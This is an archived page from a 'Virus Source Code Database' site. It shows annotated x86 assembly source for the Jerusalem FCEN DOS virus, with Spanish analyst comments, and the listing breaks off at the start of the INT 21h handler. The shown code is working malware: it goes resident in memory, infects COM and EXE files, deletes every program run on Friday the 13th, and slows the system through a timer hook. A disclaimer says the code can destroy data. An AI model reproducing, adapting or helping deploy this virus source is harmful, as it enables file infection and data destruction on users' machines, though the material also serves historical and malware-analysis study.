<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: jerufcen_asm</title>
<meta name="KEYWORDS" content="jerufcen.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for jerufcen.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="j_1808_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/j_1808_asm.php">j_1808_asm</a><br>
<a href="j-1808_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/j-1808_asm.php">j-1808_asm</a><br>
<a href="j_a204_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/j_a204_asm.php">j_a204_asm</a><br>
<a href="j-a204_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/j-a204_asm.php">j-a204_asm</a><br>
<a href="jackal_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jackal_asm.php">jackal_asm</a><br>
<a href="jap-xmas_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jap-xmas_asm.php">jap-xmas_asm</a><br>
<a href="jasmine_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jasmine_asm.php">jasmine_asm</a><br>
<a href="jaws26k_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jaws26k_asm.php">jaws26k_asm</a><br>
<a href="jaws528_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jaws528_asm.php">jaws528_asm</a><br>
<a href="je_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/je_asm.php">je_asm</a><br>
<a href="jeru_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeru_asm.php">jeru_asm</a><br>
<a href="jerubc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jerubc_asm.php">jerubc_asm</a><br>
<a href="jerube_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jerube_asm.php">jerube_asm</a><br>
<a href="jeru_dc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeru_dc_asm.php">jeru_dc_asm</a><br>
<a href="jerufcen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jerufcen_asm.php">jerufcen_asm</a><br>
<a href="jeru_fre_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeru_fre_asm.php">jeru_fre_asm</a><br>
<a href="jeru_o_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeru_o_asm.php">jeru_o_asm</a><br>
<a href="jerusale_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jerusale_asm.php">jerusale_asm</a><br>
<a href="jerusalm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jerusalm_asm.php">jerusalm_asm</a><br>
<a href="jerus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jerus_asm.php">jerus_asm</a><br>
<a href="jeruslm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeruslm_asm.php">jeruslm_asm</a><br>
<a href="jeruzal_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeruzal_asm.php">jeruzal_asm</a><br>
<a href="jeruz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeruz_asm.php">jeruz_asm</a><br>
<a href="jesus__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jesus__asm.php">jesus__asm</a><br>
<a href="jesus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jesus_asm.php">jesus_asm</a><br>
<a href="jfk3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jfk3_asm.php">jfk3_asm</a><br>
<a href="jo1_11_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jo1_11_asm.php">jo1_11_asm</a><br>
<a href="joana111_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joana111_asm.php">joana111_asm</a><br>
<a href="john_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/john_asm.php">john_asm</a><br>
<a href="johngalt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/johngalt_asm.php">johngalt_asm</a><br>
<a href="joker_3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joker_3_asm.php">joker_3_asm</a><br>
<a href="joker_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joker_asm.php">joker_asm</a><br>
<a href="jokr1602_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jokr1602_asm.php">jokr1602_asm</a><br>
<a href="joshext_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joshext_asm.php">joshext_asm</a><br>
<a href="joshi__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joshi__asm.php">joshi__asm</a><br>
<a href="joshi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joshi_asm.php">joshi_asm</a><br>
<a href="joshua_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joshua_asm.php">joshua_asm</a><br>
<a href="jo_v111_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jo_v111_asm.php">jo_v111_asm</a><br>
<a href="j_sundyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/j_sundyb_asm.php">j_sundyb_asm</a><br>
<a href="j-sundyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/j-sundyb_asm.php">j-sundyb_asm</a><br>
<a href="jump4joy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jump4joy_asm.php">jump4joy_asm</a><br>
<a href="justice_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/justice_asm.php">justice_asm</a><br>
<a href="jw2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jw2_asm.php">jw2_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/r/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/r/index.php'" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

PAGE  80,132

; лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
; лл                                                                                          лл
; лл                                 JERUSALEM FCEN                                           лл
; лл                                                                                          лл
; лл Analizo : Jose Luis Campanello (Grupo de Investigacion en Seguridad y Virus Informatico) лл
; лл Fuente  : 8-6-91 (dd-mm-aa)/(dd-mm-yy)                                                   лл
; лл                                                                                          лл
; лл Creado  : 1987 (dia no conocido)                                                         лл
; лл Origen  : Desconocido                                                                    лл
; лл                                                                                          лл
; лл El fuente debe ensamblarse y luego generar un .COM que solo instalara el virus en        лл
; лл memoria. El programa infectado no hace nada (solo termina) y fue agregado para generar   лл
; лл un infector para este virus. Los 5 ultimos bytes del programa COM final contienen el     лл
; лл VIRUS ID para que este programa no vuelva a ser infectado.                               лл
; лл En los EXE, el VIRUS ID no es grabado (los EXE pueden ser infectados un numero no        лл
; лл conocido de veces. El VIRUS ID es 'sUMsDos' (aunque el virus usa solamente 'MsDos' para  лл
; лл reconocerse). El COMMAND.COM ***NO*** es infectado.                                      лл
; лл                                                                                          лл
; лл Infeccion de COMs : Si el programa no esta infectado (VIRUS ID en los ultimos 5 bytes)   лл
; лл                     pide 64 Kb de memoria al DOS y copia el VIRUS al buffer. Luego carga лл
; лл                     el resto del programa en el buffer (si long del programa +           лл
; лл                     long virus > 64 Kb, el programa queda incompleto) y graba el buffer  лл
; лл                     (virus y programa). Finalmente graba el VIRUS ID al final del        лл
; лл                     programa y lo ejecuta.                                               лл
; лл Infeccion de EXEs : Si el programa no esta infectado (nunca lo esta), lee su header y    лл
; лл                     cambia su punto de entrada y stack (que conserva en sus datos) y los лл
; лл                     pone apuntando al codigo del VIRUS (ver rutina VIRUS) que copia al   лл
; лл                     final del EXE.                                                       лл
; лл                                                                                          лл
; лл El VIRUS ocupa menos espacio en memoria -0600h sin PSP- que en disco -0710h sin PSP- ).  лл
; лл                                                                                          лл
; лл Efectos del VIRUS : - Si el aЄo es 1987, solo infecta nuevos programas. Es muy posible   лл
; лл                       que 1987 sea el aЄo de creacion del virus y se eligio retrazar su  лл
; лл                       activacion hasta 1988 para asegurar su amplia distribucion.        лл
; лл                     - Si es VIERNES 13, todos los programas que se ordena ejecutar con   лл
; лл                       la INT 21 FUNC 4B00 son borrados antes de pasar el control al DOS  лл
; лл                       para su ejecucion.                                                 лл
; лл                     - Si NO es VIERNES 13, infecta programas y espera 30 minutos antes   лл
; лл                       de hacer un SCROOL UP de 2 lineas en una ventana que va desde      лл
; лл                       (5,5) a (16,16) y luego de esto, con cada interrupcion de reloj    лл
; лл                       hace una lectura de 16 Kb para ralentizar el sistema en un factor  лл
; лл                       de **************************************************************  лл
; лл                                                                                          лл
; лл El virus tiene una funcion sofisticada que permite copiar cualquier cantidad de bytes    лл
; лл ( > 64 Kb ) hacia una direccion absoluta menor y retornar con nuevos CS:IP y SS:SP. Esta лл
; лл funcion nunca es usada por el virus. Originalmente, la idea del programador debio haber  лл
; лл sido poner el codigo del virus entre el header-tabla-de-reubicaciones del EXE y su       лл
; лл codigo, aunque esta funcion puede ser herencia de otras versiones de Jerusalem o Suriv.  лл
; лл                                                                                          лл
; лл Remocion : Standard para un Jerusalem Virus Family Member                                лл
; лл                                                                                          лл
; лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

parag_PSP       equ     0100h / 16                              ; cantidad de paragraphs del PSP
VIERNES         equ     05h                                     ; codigo de dia del viernes


seg_extra       segment at 0000h
                assume  cs:seg_extra, ds:nothing, es:nothing, ss:nothing


                org     03FCh

rut_copia       proc    far                                     ; cuando se instale el virus, va a
tbint_offFFh    dw      ?                                       ; ФП direccion del puntero a la
tbint_segFFh    db      ?                                       ; Фй int FF en la tb de ints
rut_copia       endp                                            ; haber una rutina que copia mem

seg_extra       ends



_codeseg        segment
                assume  cs:_codeseg, ds:_codeseg, es:_codeseg, ss:_codeseg


                org     002Ch

seg_envblock    dw      ?                                       ; segmento del environment block
max_envblock    equ     7FFFh                                   ; longitud maxima del env block


                org     005Ch
FCB1            db      ?                                       ; FCB1 del huesped


                org     006Ch
FCB2            db      ?                                       ; FCB2 del huesped


                org     0080h
COMM_LINE       db      80h dup (?)                             ; linea de comandos del huesped


                org     100h

jerufcen        proc    far

start:
                jmp     inicio


long_virus      =       offset inicio_huesped-offset start
_tope_stack     =       offset _stack_extra-offset start
_tope_stack_xtr =       offset inicio_huesped-offset start
longparte_resid =       offset inicio_huesped-offset start


VIRUS_IDEXPAND  db      'sU'                                    ; el VIRUS ID completo es 'sUMsDos'
                                                                ; el 'sU' esta posiblemente
                                                                ; relacionado con el 'sURIV'
                                                                ; (ID del Suriv 3.0)
VIRUS_ID        db      'MsDos'                                 ; identificador del virus
long_VIRUS_ID   equ     $-offset VIRUS_ID
ip_funcDD       dw      ?                                       ; ФП cs:ip usados para retornar al
cs_funcDD       dw      ?                                       ; Фй pgm luego de sacar el virus
VIRUS_borrarpgm db      00h                                     ; indica si esta activo (01)
FCBini_funcDD   dw      0000h                                   ; descriptor de FCB que pasa el DOS
                                                                ; a cada programa cuando comienza
long_huesped    dw      offset HUESPED_INFEC-offset inicio_huesped ; longitud del programa original
offvie_int08h   dw      ?                                       ; ФП puntero de la
segvie_int08h   dw      ?                                       ; Фй vieja int 08h
offvie_int21h   dw      ?                                       ; ФП puntero de la
segvie_int21h   dw      ?                                       ; Фй vieja int 21h
infec_offint24h dw      ?                                       ; ФП puntero de la
infec_segint24h dw      ?                                       ; Фй vieja int 24h
molestia        dw      0000h                                   ; indica la cantidad de ints 08
                                                                ; que faltan para que el virus
                                                                ; comienze a molestar (si faltan
                                                                ; 2, hace un scrool; si falta 1,
                                                                ; pierde tiempo
clean_parameter dw      8 dup (0000h)                           ; tabla pasada por el virus para
                                                                ; que el residente lo saque del
                                                                ; huesped. Esta tabla tiene la
                                                                ; siguiente forma:
                                                                ;
                                                                ; byte uso
                                                                ; 00 w drv specifiers (FCBs valids)
                                                                ; 02 d cs:ip del huesped
                                                                ; 06 d ss:sp del huesped
                                                                ; 0A w # of bytes a borrar (debe
                                                                ;      ser multiplo de 16)
                                                                ; 0C w # de bytes luego del ultimo
                                                                ;      blk de 64Kb completos
                                                                ; 0E w # de blks de 64Kb completos
seg_virus       dw      ?                                       ; segmento del virus
virus_parag     dw      ?                                       ; longitud en paragraphs del virus

; lo siguiente es un parameter block para la ejecucion de un huesped
paramblock      dw      0000h                                   ; usar el env del virus
                dw      offset COMM_LINE                        ; ФП puntero a la
parblk_segCOMLI dw      ?                                       ; Фй linea de comandos
                dw      offset FCB1                             ; ФП puntero al
parblk_segFCB1  dw      ?                                       ; Фй FCB1
                dw      offset FCB2                             ; ФП puntero al
parblk_segFCB2  dw      ?                                       ; Фй FCB2
infec_spEXEhead dw      ?                                       ; ФП copia del ss:sp
infec_ssEXEhead dw      ?                                       ; Фй del viejo EXE
infec_ipEXEhead dw      ?                                       ; ФП copia del cs:ip
infec_csEXEhead dw      ?                                       ; Фй del viejo EXE
offvie_intFFh   dw      ?                                       ; ФП low seg:desp del
lowsegvi_intFFh db      ?                                       ; Фй punt a la int FFh
                                                                ;  xref 75DA:18AA
infec_esCOM     db      00h                                     ; indica si el arch a infectar
                                                                ; es COM (00) o EXE (01)
infec_EXEhead   dw      14 dup (?)                              ; buffer para el header del EXE
long_header     equ     size infec_EXEhead                      ; longitud del header del EXE
infec_buffvirid db      5 dup (?)                               ; buffer usado para leer los 5
                                                                ; ultimos bytes del archivo a infec
infec_fhandle   dw      0FFFFh                                  ; file handle usado en la infeccion
infec_atrib     dw      ?                                       ; atributos del arch a infectar
infec_fdate     dw      ?                                       ; fecha de creacion (para infec)
infec_ftime     dw      ?                                       ; hora de creacion (para infec)
infec_longpag   dw      0200h                                   ; longitud de la pagina de un EXE
infec_longparag dw      0010h                                   ; longitud de un paragrafo
infec_longEXE   dd      ?                                       ; longitud en bytes del EXE
                                                                ; (redondeada a un multiplo de 16)
infec_off_fname dw      ?                                       ; ФП puntero al file name usado
infec_seg_fname dw      ?                                       ; Фй para infectar (func 4B00)
command         db      'COMMAND.COM'                           ; no infecta el COMMAND.COM

long_command    equ     $-offset command                        ; long del nombre 'COMMAND.COM'

infec_pidiomem  dw      0000h                                   ; si es 0001 => pidio mem en infec
                db      00h, 00h, 00h, 00h


inicio:
                cld                                             ; incremento de direcciones
                mov     ah,0E0h                                 ; ФП la funcion E0 no esta definida
                int     21h                                     ;  Г a menos que el virus ya este
                                                                ; Фй activo y residente en memoria
                cmp     ah,0E0h                                 ; ФП si el codigo retornado
                jae     loc_3                                   ;  Г es menor a 03 o
                cmp     ah,03h                                  ;  Г mayor o igual a E0
                jb      loc_3                                   ; Фй => loc_3 (virus no residente)
                mov     ah,0DDh                                 ; ah = DD (definida si el virus
                                                                ;      ya esta residente. copia
                                                                ;      cx bytes de memoria desde
                                                                ;      SI a DI y retorna a CS:0100
                                                                ;      del que la llamo
                mov     di,offset start                         ; di = direccion destino
                mov     si,long_virus                           ; ФП si = direccion fuente
                add     si,di                                   ; Фй      (long virus + psp)
                mov     cx,cs:[di+long_huesped-offset start]    ; cx = long del pgm infectado
                nop                                             ; para completar la direccion
                                                                ; (que en el virus es de 16 bits
                                                                ; y el ensamblador deja de 8 bits
                                                                ; entonces, para que las direcciones
                                                                ; queden con el mismo valor)
                int     21h                                     ; copia el huesped y lo ejecuta
loc_3:
                mov     ax,cs                                   ; ФП
                add     ax,parag_PSP                            ;  Г ss:sp = cs+0010:0700
                mov     ss,ax                                   ;  Г         (saltea el PSP)
                mov     sp,_tope_stack                          ; Фй
                push    ax                                      ; ФП pone como direccion de
                mov     ax,offset VIRUS-offset start            ;  Г retorno (FAR) el rotulo
                push    ax                                      ; Фй VIRUS (cs = cs + 0010)
                ret                                             ; Return far
jerufcen        endp

VIRUS           proc    far
                cld                                             ; incremento de direcciones
                push    es                                      ; salva es
                mov     cs:[seg_virus-offset start],es          ; guarda el segmento del virus
                mov     cs:[parblk_segCOMLI-offset start],es    ; ФП completa los segmentos
                mov     cs:[parblk_segFCB1-offset start],es     ;  Г del parameter block para
                mov     cs:[parblk_segFCB2-offset start],es     ; Фй la ejecucion del huesped
                mov     ax,es                                   ; ФП corrige el cs y ss por si
                add     ax,parag_PSP                            ;  Г fue un EXE (el codigo debe
                add     cs:[infec_csEXEhead-offset start],ax    ;  Г ser relativo a cero)
                add     cs:[infec_ssEXEhead-offset start],ax    ; Фй
                mov     ah,0E0h                                 ; ФП ve si el virus ya
                int     21h                                     ; Фй esta residente
                cmp     ah,0E0h                                 ; ФП si ah ђ E0 (virus no en MEM)
                jae     instala_virus                           ; Фй => instala el virus
                cmp     ah,03h                                  ; *********************************
                pop     es                                      ; restaura es
                mov     ss,cs:[infec_ssEXEhead-offset start]    ; ФП ss:sp = ss:sp (que habia en
                mov     sp,cs:[infec_spEXEhead-offset start]    ; Фй         el header del EXE)
                jmp     dword ptr cs:[infec_ipEXEhead-offset start] ; => al cs:ip del EXE header
instala_virus:
                assume  es: seg_extra
                xor     ax,ax                                   ; ФП es = 0000 (segmento de
                mov     es,ax                                   ; Фй            interrupciones)
                mov     ax,es:[tbint_offFFh]                    ; ФП
                mov     cs:[offvie_intFFh-offset start],ax      ;  Г guarda los 3 primeros bytes
                mov     al,es:[tbint_segFFh]                    ;  Г del punt a la int FF
                mov     cs:[lowsegvi_intFFh-offset start],al    ; Фй
                mov     word ptr es:[tbint_offFFh],0A5F3h       ; ФП pone :  F3/A5 repz movsw
                mov     byte ptr es:[tbint_segFFh],0CBh         ;  Г         CB    retf
                                                                ;  Г
                                                                ;  Г en 0000:03FC (donde esta el
                                                                ; Фй            punt a la int FF)
                pop     ax                                      ; ФП
                add     ax,0010h                                ;  Г es = es (punt al PSP) + 0010h
                mov     es,ax                                   ; Фй      (es = puntero al codigo)
                push    cs                                      ; ФП ds = cs
                pop     ds                                      ; Фй
                mov     cx,long_virus                           ; ФП cx = long_virus / 2
                shr     cx,1                                    ; Фй      (# words a mover)
                xor     si,si                                   ; si = 0000 ФП aparentemente copia
                mov     di,si                                   ; di = 0000 Фй sobre el mismo lugar
                push    es                                      ; ФП salva la direccion de retorno
                mov     ax,offset ya_se_movio-offset start      ;  Г de la rutina de copia
                push    ax                                      ; Фй (es:ya_se_movio-offset start)
                assume  es: _codeseg
                jmp     seg_extra:rut_copia                     ; copia el virus (si es EXE
                                                                ; lo pone luego del PSP)
ya_se_movio:
                assume  ds:seg_extra
                mov     ax,cs                                   ; ФП
                mov     ss,ax                                   ;  Г ss:sp = cs:_tope_stack
                mov     sp,_tope_stack                          ; Фй
                xor     ax,ax                                   ; ФП ds = 0000
                mov     ds,ax                                   ; Фй
                mov     ax,cs:[offvie_intFFh-offset start]      ; ФП
                mov     ds:[tbint_offFFh],ax                    ;  Г restaura los 3 bytes
                mov     al,cs:[lowsegvi_intFFh-offset start]    ;  Г del punt a la int FF
                mov     ds:[tbint_segFFh],al                    ; Фй
                mov     bx,sp                                   ; ФП
                mov     cl,04h                                  ;  Г bx = sp / 16 + parag_PSP
                shr     bx,cl                                   ;  Г (long en parag del virus
                add     bx,10h                                  ; Фй  para reducir el bloque)
                mov     cs:[virus_parag-offset start],bx        ; pone la longitud en par
                mov     ah,4Ah                                  ; ah = cambiar long del bloque
                mov     es,cs:[seg_virus-offset start]          ; es = seg del virus
                int     21h                                     ; ФП achica el bloque al
                                                                ; Фй tamaЄo del virus
                mov     ax,3521h                                ; ФП es:bx = puntero de la
                int     21h                                     ; Фй         int 21h
                mov     cs:[offvie_int21h-offset start],bx      ; ФП salva la direccion
                mov     cs:[segvie_int21h-offset start],es      ; Фй de la int 21h
                assume  ds: _codeseg
                push    cs                                      ; ФП
                pop     ds                                      ;  Г pone la int 21 en
                mov     dx,offset int21h-offset start           ;  Г int21h (parte del VIRUS)
                mov     ax,2521h                                ;  Г
                int     21h                                     ; Фй
                mov     es,ds:[seg_virus-offset start]          ; ФП es = seg del environment
                mov     es,es:[seg_envblock]                    ; Фй      block
                xor     di,di                                   ; di = punt al comienzo del env blk
                mov     cx,max_envblock                         ; maxima long del env blk
                xor     al,al                                   ; al = 00 (busca un 00 00)
locloop_4:                                                      ; ФП
                repne   scasb                                   ;  Г busca el fin del env blk
                cmp     es:[di],al                              ;  Г para obtener el pgm name
                loopnz  locloop_4                               ; Фй
                mov     dx,di                                   ; dx = di (punt al pgm name)
                add     dx,03h                                  ; dx + 3 (salta el 00 y extra cnt)
                                                                ; (en el env blk estan las cadenas
                                                                ; de entorno -ASCIIZ- que terminan
                                                                ; con una cadena nula -00-, luego
                                                                ; esta la cant de param extra -2
                                                                ; bytes- y luego el pgm name
                                                                ; completo de invocacion)
                mov     ax,4B00h                                ; ax = cargar y ejecutar pgm
                push    es                                      ; ФП ds = es
                pop     ds                                      ; Фй
                push    cs                                      ; ФП
                pop     es                                      ;  Г es:bx = puntero al param blk
                mov     bx,offset paramblock-offset start       ; Фй
                push    ds                                      ; ФП
                push    es                                      ;  Г
                push    ax                                      ;  Г salva ds, es, ax, bx, cx, dx
                push    bx                                      ;  Г
                push    cx                                      ;  Г
                push    dx                                      ; Фй
                mov     ah,2Ah                                  ; ФП obtiene la fecha actual
                int     21h                                     ;  Г (cx=aЄo, dh=mes, dl=dia,
                                                                ; Фй  al=dia de la sem)
                mov     byte ptr cs:[VIRUS_borrarpgm-offset start],00h ; asume que no debe borrar pgms
                cmp     cx,1987                                 ; ФП si es 1987
                je      loc_6                                   ; Фй => loc_6 (no se activa)
                cmp     al,VIERNES                              ; ФП
                jne     loc_5                                   ;  Г si no es VIERNES 13
                cmp     dl,13                                   ;  Г => loc_5 (no borra pgms)
                jne     loc_5                                   ; Фй
                inc     byte ptr cs:[VIRUS_borrarpgm-offset start] ; indica que debe borrar pgms
                jmp     short loc_6                             ; => loc_6 (ejec el huesped)
                nop
loc_5:
                mov     ax,3508h                                ; ФП
                int     21h                                     ;  Г salva el puntero de
                mov     cs:[offvie_int08h-offset start],bx      ;  Г la vieja int 08
                mov     cs:[segvie_int08h-offset start],es      ; Фй
                push    cs                                      ; ФП ds = cs
                pop     ds                                      ; Фй
                mov     word ptr ds:[molestia-offset start],7E90h ; indica esperar 30 min antes
                                                                  ; de comenzar a molestar
                mov     ax,2508h                                ; ФП pone el puntero de la
                mov     dx,offset int08h-offset start           ;  Г int 08 en cs:int08h-off start
                int     21h                                     ; Фй
loc_6:
                pop     dx                                      ; ФП
                pop     cx                                      ;  Г
                pop     bx                                      ;  Г restaura dx, cx, bx,
                pop     ax                                      ;  Г          ax, es, ds
                pop     es                                      ;  Г
                pop     ds                                      ; Фй
                pushf                                           ; ФП simula una INT 21
                call    dword ptr cs:[offvie_int21h-offset start] ; Фй (ejecuta el pgm huesped)
                push    ds                                      ; ФП es = ds (segmento del env blk)
                pop     es                                      ; Фй
                mov     ah,49h                                  ; ФП libera el env block
                int     21h                                     ; Фй (del virus)
                mov     ah,4Dh                                  ; ФП obtiene el codigo de
                int     21h                                     ; Фй retorno del huesped
                mov     ah,31h                                  ; ah = 31 (quedar residente)
                mov     dx,longparte_resid                      ; ФП
                mov     cl,04h                                  ;  Г dx = long residente / 16
                shr     dx,cl                                   ;  Г      + 10h (PSP)
                add     dx,10h                                  ; Фй
                int     21h                                     ; queda residente
VIRUS           endp


; лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
; лл                                                                                          лл
; лл                    interrupcion 24h del virus                                           лл
; лл                                                                                          лл
; лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

int24h          proc    far
                xor     al,al                                   ; indica ignorar
                iret
int24h          endp


; лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
; лл                                                                                          лл
; лл                    interrupcion 08h del virus                                            лл
; лл                                                                                          лл
; лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

int08h          proc    far
                cmp     word ptr CS:[molestia-offset start],0002h ; ФП si no indica scrool
                jnz     loc_12                                    ; Фй => loc_12 (pierde tiempo)
                push    ax                                      ; ФП
                push    bx                                      ;  Г
                push    cx                                      ;  Г salva ax, bx, cx, dx, bp
                push    dx                                      ;  Г
                push    bp                                      ; Фй
                mov     ax,0602h                                ; ФП hace un scrool up de la
                mov     bh,87h                                  ;  Г (5,5) a la (16,16) y
                mov     cx,0505h                                ;  Г las nuevas lineas las
                mov     dx,1010h                                ;  Г pone blinking
                int     10h                                     ; Фй
                pop     bp                                      ; ФП
                pop     dx                                      ;  Г
                pop     cx                                      ;  Г restaura bp, dx, cx, bx, ax
                pop     bx                                      ;  Г
                pop     ax                                      ; Фй
loc_12:
                dec     word ptr cs:[molestia-offset start]     ; ФП decrementa el counter (espera
                                                                ;  Г 29 min 40 seg antes de
                                                                ;  Г ralentizar la maquina)
                jnz     sale_int08h                             ;  Г si no termino la espera
                                                                ; Фй => vieja int 08
                mov     word ptr cs:[molestia-offset start],0001h ; perder tiempo en la prox int 08
                push    ax                                      ; ФП
                push    cx                                      ;  Г salva ax, cx, si
                push    si                                      ; Фй
                mov     cx,4001h                                ; ФП pierde tiempo
                repz    lodsb                                   ; Фй (lee 16 Kb
                pop     si                                      ; ФП
                pop     cx                                      ;  Г restaura si, cx, ax
                pop     ax                                      ; Фй
sale_int08h:
                jmp     dword ptr cs:[offvie_int08h-offset start] ; ejecuta la vieja int 08
int08h          endp


; лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
; лл                                                                                          лл
; лл                    interrupcion 21h del virus                                            лл
